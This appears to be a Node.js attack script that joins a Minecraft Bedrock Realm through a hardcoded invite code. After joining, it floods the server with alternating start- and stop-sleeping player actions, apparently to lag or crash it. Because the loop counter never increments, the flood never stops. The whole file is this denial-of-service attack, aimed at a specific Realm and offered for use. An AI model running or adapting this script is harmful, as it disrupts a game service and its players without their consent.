const bedrock = require('bedrock-protocol');

async function test(invite) {
    try {
        const client = bedrock.createClient({
            realms: { realmInvite: invite },
            skipPing: true
        });


        client.on('kick', (packet) => {
            if(!client) return // what
            console.log(packet);
        });

        client.on('disconnect', (packet) => {
            if(!client) return // what
            console.log(packet);
        });

        let messageCount = 0
        client.on('start_game', (packet) => {
            const action = {
                runtime_entity_id: packet.runtime_entity_id, // get from start game
                position: { x: 0, y: 0, z: 0 },
                result_position: { x: 0, y: 0, z: 0 },
                face: 0
            };


            while (messageCount < 6000) {
                client.write("player_action", { ...action, action: "start_sleeping" });
                client.write("player_action", { ...action, action: "stop_sleeping" });
            }
        });

        
        
    } catch (error) {
        console.error(`${error.message}`);
    }
}



test('Yx2-Nwinxc8gNSY')